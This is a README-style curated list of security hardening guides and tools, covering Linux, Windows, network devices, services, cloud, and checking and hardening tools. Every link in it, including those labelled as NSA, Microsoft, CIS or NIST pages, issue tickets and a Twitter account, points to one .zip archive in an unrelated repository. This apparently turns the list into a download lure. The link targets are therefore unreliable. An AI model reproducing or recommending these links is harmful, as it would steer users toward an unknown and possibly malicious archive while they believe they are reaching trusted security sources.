# awesome-security-hardening

[![Awesome](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

A collection of awesome security hardening guides, best practices, checklists, benchmarks, tools and other resources.
This is work in progress: please contribute by sending your suggestions. You may do this by creating [issue tickets](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) or forking, editing and sending pull requests. You may also send suggestions on Twitter to [@decalage2](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip), or use https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip

------
# Table of Contents

- [Security Hardening Guides and Best Practices](#security-hardening-guides-and-best-practices)
  - [Hardening Guide Collections](#hardening-guide-collections)
  - [GNU/Linux](#gnulinux)
    - [Red Hat Enterprise Linux - RHEL](#red-hat-enterprise-linux---rhel)
    - [CentOS](#centos)
    - [SUSE](#suse)
    - [Ubuntu](#ubuntu)
  - [Windows](#windows)
  - [macOS](#macos)
  - [Network Devices](#network-devices)
    - [Switches](#switches)
    - [Routers](#routers)
    - [IPv6](#ipv6)
    - [Firewalls](#firewalls)
  - [Virtualization - VMware](#virtualization---vmware)
  - [Containers - Docker](#containers---docker)
  - [Services](#services)
    - [SSH](#ssh)
    - [TLS/SSL](#tlsssl)
    - [Web Servers](#web-servers)
      - [Apache HTTP Server](#apache-http-server)
      - [Apache Tomcat](#apache-tomcat)
      - [Eclipse Jetty](#eclipse-jetty)
      - [Microsoft IIS](#microsoft-iis)
    - [Mail Servers](#mail-servers)
    - [FTP Servers](#ftp-servers)
    - [Database Servers](#database-servers)
    - [Active Directory](#active-directory)
    - [ADFS](#adfs)
    - [Kerberos](#kerberos)
    - [LDAP](#ldap)
    - [DNS](#dns)
    - [NTP](#ntp)
    - [NFS](#nfs)
    - [CUPS](#cups)
  - [Authentication - Passwords](#authentication---passwords)
  - [Hardware - CPU - BIOS - UEFI](#hardware---cpu---bios---uefi)
  - [Cloud](#cloud)
- [Tools](#tools)
  - [Tools to check security hardening](#tools-to-check-security-hardening)
    - [GNU/Linux](#gnulinux-1)
    - [Windows](#windows-1)
    - [Network Devices](#network-devices-1)
    - [TLS/SSL](#tlsssl-1)
    - [SSH](#ssh-1)
    - [Hardware - CPU - BIOS - UEFI](#hardware---cpu---bios---uefi-1)
    - [Docker](#docker)
    - [Cloud](#cloud-1)
  - [Tools to apply security hardening](#tools-to-apply-security-hardening)
    - [GNU/Linux](#gnulinux-2)
    - [Windows](#windows-2)
    - [TLS/SSL](#tlsssl-2)
    - [Cloud](#cloud-2)
  - [Password Generators](#password-generators)
- [Books](#books)
- [Other Awesome Lists](#other-awesome-lists)
  - [Other Awesome Security Lists](#other-awesome-security-lists)

------

# Security Hardening Guides and Best Practices

## Hardening Guide Collections

- [CIS Benchmarks](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (registration required)
- [ANSSI Best Practices](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [NSA Security Configuration Guidance](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [NSA Cybersecurity Resources for Cybersecurity Professionals](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) and [NSA Cybersecurity publications](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [US DoD DISA Security Technical Implementation Guides (STIGs) and Security Requirements Guides (SRGs)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [OpenSCAP Security Policies](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Australian Cyber Security Center Publications](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [FIRST Best Practice Guide Library (BPGL)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Harden the World](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - a collection of hardening guidelines for devices, applications and OSs (mostly Apple for now).

## GNU/Linux

- [ANSSI - Configuration recommendations of a GNU/Linux system](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [CIS Benchmark for Distribution Independent Linux](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [trimstray - The Practical Linux Hardening Guide](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - practical step-by-step instructions for building your own hardened systems and services. Tested on CentOS 7 and RHEL 7.
- [trimstray - Linux Hardening Checklist](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - most important hardening rules for GNU/Linux systems (summarized version of The Practical Linux Hardening Guide) 
- [How To Secure A Linux Server](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - for a single Linux server at home
- [nixCraft - 40 Linux Server Hardening Security Tips (2019 edition)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [nixCraft - Tips To Protect Linux Servers Physical Console Access](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [TecMint - 4 Ways to Disable Root Account in Linux](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [ERNW - IPv6 Hardening  Guide  for  Linux Servers](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [trimstray - Iptables Essentials: Common Firewall Rules and Commands](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Neo23x0/auditd](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Best Practice Auditd Configuration

### Red Hat Enterprise Linux - RHEL

- [Red Hat - A Guide to Securing Red Hat Enterprise Linux 7](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [DISA STIGs - Red Hat Enterprise Linux 7](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2019)
- [CIS Benchmark for Red Hat Linux](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [nixCraft - How to set up a firewall using FirewallD on RHEL 8](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### CentOS

- [Lisenet - CentOS 7 Server Hardening Guide](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2017)
- [https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip - Security Harden CentOS 7](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2015)

### SUSE

- [SUSE Linux Enterprise Server 12 SP4 Security Guide](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [SUSE Linux Enterprise Server 12 Security and Hardening Guide](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### Ubuntu

- [Ubuntu documentation - Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Ubuntu wiki - Security Hardening Features](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

## Windows

- [Microsoft - Windows security baselines](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Microsoft - Windows Server Security | Assurance](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Microsoft - Windows 10 Enterprise Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [BSI/ERNW - Configuration Recommendations for Hardening of Windows 10 Using Built-in Functionalities](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2021) - focused on Windows 10 LTSC 2019
- [ACSC - Hardening Microsoft Windows 10, version 21H1, Workstations](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [ACSC - Securing PowerShell in the Enterprise](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Awesome Windows Domain Hardening](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Microsoft - How to detect, enable and disable SMBv1, SMBv2, and SMBv3 in Windows and Windows Server](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Microsoft recommended block rules](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - List of applications or files that can be used by an attacker to circumvent application whitelisting policies
- [ERNW - IPv6 Hardening Guide for Windows Servers](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [NSA - AppLocker Guidance](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Configuration guidance for implementing application whitelisting with AppLocker
- [NSA - Pass the Hash Guidance](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Configuration guidance for implementing Pass-the-Hash mitigations (Archived)
- [NSA - BitLocker Guidance](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Configuration guidance for implementing disk encryption with BitLocker
- [NSA - Event Forwarding Guidance](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Configuration guidance for implementing collection of security relevant Windows Event Log events by using Windows Event Forwarding
- [Windows Defense in Depth Strategies](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - work in progress
- [Endpoint Isolation with the Windows Firewall](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) based on Jessica Payne’s [‘Demystifying the Windows Firewall’](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) talk from Ignite 2016

See also [Active Directory](#active-directory) and [ADFS](#adfs) below.

## macOS

- [ERNW - IPv6 Hardening Guide for OS-X](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

## Network Devices

- [NSA - Harden Network Devices](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - very short but good summary

### Switches

- [DISA - Layer 2 Switch SRG](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### Routers

- [NSA - A Guide to Border Gateway Protocol (BGP) Best Practices](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### IPv6

- ERNW - Developing an Enterprise IPv6 Security Strategy [Part 1](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip), [Part 2](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip), [Part 3](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip), [Part 4](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Network Isolation on the Routing Layer, Traffic Filtering in IPv6 Networks
- see also IPv6 links under GNU/Linux, Windows and macOS

### Firewalls

- [NIST SP 800-41 Rev 1 - Guidelines on Firewalls and Firewall Policy](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2009)
- [trimstray - Iptables Essentials: Common Firewall Rules and Commands](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

## Virtualization - VMware

- [VMware Security Hardening Guides](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - covers most VMware products and versions
- [CIS VMware ESXi 6.5 Benchmark](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2018)
- [DISA STIGs - Virtualisation](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - VMware vSphere 6.0 and 5
- [ENISA - Security aspects of virtualization](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - generic, high-level best practices for virtualization and containers (Feb 2017)
- [NIST SP 800-125 - Guide to Security for Full Virtualization Technologies](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - (2011)
- [NIST SP 800-125A Revision 1 - Security Recommendations for Server-based Hypervisor Platforms](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2018)
- [NIST SP 800-125B Secure Virtual Network Configuration for Virtual Machine (VM) Protection](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2016)
- [ANSSI - Recommandations de sécurité pour les architectures basées sur VMware vSphere ESXi](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - for VMware 5.5 (2016), in French
- [ANSSI - Problématiques de sécurité associées à la virtualisation des systèmes d’information](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2013), in French

## Containers - Docker

- [How To Harden Your Docker Containers](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [CIS Docker Benchmarks](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - registration required
- [NIST SP 800-190 - Application Container Security Guide](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [A Practical Introduction to Container Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [ANSSI - Recommandations de sécurité relatives au déploiement de conteneurs Docker](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2020), in French

## Services

### SSH

- [NIST IR 7966 - Security of Interactive and Automated Access Management Using Secure Shell (SSH)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [ANSSI - (Open)SSH secure use recommendations](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Linux Audit - OpenSSH security and hardening](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Positron Security SSH Hardening Guides](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2017-2018) - focused on crypto algorithms
- [stribika - Secure Secure Shell](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2015) - some algorithm recommendations might be slightly outdated
- [Applied Crypto Hardening: https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - handy reference on how to configure the most common services’ crypto settings (TLS/SSL, PGP, SSH and other cryptographic tools)
- [IETF - Key Exchange (KEX) Method Updates and Recommendations for Secure Shell (SSH) draft-ietf-curdle-ssh-kex-sha2-10](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - update to the recommended set of key exchange methods for use in the Secure Shell (SSH) protocol to meet evolving needs for stronger security. This document updates RFC 4250.
- [Gravitational - How to SSH Properly](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - how to configure SSH to use certificates and two-factor authentication

### TLS/SSL

- [NIST SP800-52 Rev 2 (2nd draft) - Guidelines for the Selection, Configuration, and Use of Transport Layer Security (TLS) Implementations](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - 2018, recommends TLS 1.3
- [Netherlands NCSC - IT Security Guidelines for Transport Layer Security (TLS)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - 2019
- [ANSSI - Security Recommendations for TLS](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - 2017, does not cover TLS 1.3
- [Qualys SSL Labs - SSL and TLS Deployment Best Practices](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - 2017, does not cover TLS 1.3
- [RFC 7540 Appendix A TLS 1.2 Cipher Suite Black List](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Applied Crypto Hardening: https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - handy reference on how to configure the most common services’ crypto settings (TLS/SSL, PGP, SSH and other cryptographic tools)

### Web Servers

- [https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip - Strong Ciphers for Apache, nginx and Lighttpd](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

#### Apache HTTP Server

- [Apache HTTP Server documentation - Security Tips](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [GeekFlare - Apache Web Server Hardening and Security Guide](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Apache Config - Apache Security Hardening Guide](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

#### Apache Tomcat

- [Apache Tomcat 9 Security Considerations](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) / [v8](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) / [v7](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [OWASP Securing tomcat](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [How to get Tomcat 9 to work with authbind to bind to port 80](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

#### Eclipse Jetty

- [Eclipse Jetty - Configuring Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Jetty hardening](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2015)

#### Microsoft IIS

- [CIS Microsoft IIS Benchmarks](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### Mail Servers

### FTP Servers

### Database Servers

### Active Directory

- [Microsoft - Best Practices for Securing Active Directory](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [ANSSI CERT-FR - Active Directory Security Assessment Checklist](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - 2020 (English and French versions)
- ["Admin Free" Active Directory and Windows, Part 1- Understanding Privileged Groups in AD](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- ["Admin Free" Active Directory and Windows, Part 2- Protected Accounts and Groups in Active Directory](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### ADFS

- [https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip - Securing Microsoft Active Directory Federation Server (ADFS)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Microsoft - Best practices for securing Active Directory Federation Services](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### Kerberos

- [CIS MIT Kerberos 1.10 Benchmark](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - 2012

### LDAP

- [OpenLDAP Software 2.4 Administrator's Guide - OpenLDAP Security Considerations](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Best Practices in LDAP Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2011)
- [LDAP: Hardening Server Security (so administrators can sleep at night)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [LDAP Authentication Best Practices](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - retrieved from https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip
- [Hardening OpenLDAP on Linux with AppArmor and systemd](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - slides
- [zytrax LDAP for Rocket Scientists - LDAP Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [How To Encrypt OpenLDAP Connections Using STARTTLS](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### DNS

- [CIS - BIND DNS Server 9.9 Benchmark](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2017)
- [DISA STIGs - BIND 9.x](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2019)
- [NIST SP 800-81-2 - Secure Domain Name System (DNS) Deployment Guide](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2013)
- [CMU SEI - Six Best Practices for Securing a Robust Domain Name System (DNS) Infrastructure](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [NSA BIND 9 DNS Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (2011)

### NTP

- [IETF - Network Time Protocol Best Current Practices draft-ietf-ntp-bcp](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (last draft #13 in March 2019)
- [CMU SEI - Best Practices for NTP Services](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip - Arrive On Time With NTP -- Part 2: Security Options](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip - Arrive On Time With NTP -- Part 3: Secure Setup](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### NFS

- [Linux NFS-HOWTO - Security and NFS](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - a good overview of NFS security issues and some mitigations
- [Red Hat - A Guide to Securing Red Hat Enterprise Linux 7 - Securing NFS](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [Red Hat - RHEL7 Storage Administration Guide - Securing NFS](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [NFSv4 without Kerberos and permissions](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - why NFSv4 without Kerberos does not provide security
- [CertDepot - RHEL7: Use Kerberos to control access to NFS network shares](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

### CUPS

- [CUPS Server Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

## Authentication - Passwords

- [UK NCSC - Password administration for system owners](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [NIST SP 800-63 Digital Identity Guidelines](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [OWASP Password Storage Cheat Sheet](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

## Hardware - CPU - BIOS - UEFI

- [ANSSI - Hardware security requirements for x86 platforms](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - recommendations for security features and configuration options applying to hardware devices (CPU, BIOS, UEFI, etc) (Nov 2019)
- [NSA - Hardware and Firmware Security Guidance](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Guidance for the Spectre, Meltdown, Speculative Store Bypass, Rogue System Register Read, Lazy FP State Restore, Bounds Check Bypass Store, TLBleed, and L1TF/Foreshadow vulnerabilities as well as general hardware and firmware security guidance.
- [NSA Info Sheet: UEFI Lockdown Quick Guidance (March 2018)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [NSA Tech Report: UEFI Defensive Practices Guidance (July 2017)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)

## Cloud

- [NSA Info Sheet: Cloud Security Basics (August 2018)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [DISA DoD Cloud Computing Security](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip - Build a Secure Cloud](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A free repository of customizable AWS security configurations and best practices

# Tools

## Tools to check security hardening

- [Chef InSpec](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - open-source testing framework by Chef that enables you to specify compliance, security, and other policy requirements. can run on Windows and many Linux distributions. 

### GNU/Linux

- [Lynis](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - script to check the configuration of Linux hosts
- [OpenSCAP Base](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - oscap command line tool
- [SCAP Workbench](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - GUI for oscap
- [Tiger - The Unix security audit and intrusion detection tool](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) (might be outdated)
- [otseca](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Open source security auditing tool to search and dump system configuration. It allows you to generate reports in HTML or RAW-HTML formats.
- [SUDO_KILLER](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - A tool to identify sudo rules' misconfigurations and vulnerabilities within sudo
- [CIS Benchmarks Audit](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - bash script which performs tests against your CentOS system to give an indication of whether the running server may comply with the CIS v2.2.0 Benchmarks for CentOS (only CentOS 7 for now)

### Windows

- [Microsoft Security Compliance Toolkit 1.0](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - set of tools that allows enterprise security administrators to download, analyze, test, edit, and store Microsoft-recommended security configuration baselines for Windows and other Microsoft products
- [Microsoft DSC Environment Analyzer (DSCEA)](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - simple implementation of PowerShell Desired State Configuration that uses the declarative nature of DSC to scan Windows OS based systems in an environment against a defined reference MOF file and generate compliance reports as to whether systems match the desired configuration
- [HardeningAuditor](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Scripts for comparing Microsoft Windows compliance with the Australian ASD 1709 & Office 2016 Hardening Guides
- [PingCastle](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - Tool to check the security of Active Directory

### Network Devices

- [Nipper-ng](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - to check the configuration of network devices (does not seem to be updated)

### TLS/SSL

- [Qualys SSL Labs - List of tools to assess TLS/SSL servers and clients](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip)
- [SSL Decoder](https://raw.githubusercontent.com/joymondal/awesome-security-hardening/master/symphilic/awesome-security-hardening.zip) - checks the SSL/TLS configuration of a server

### SSH

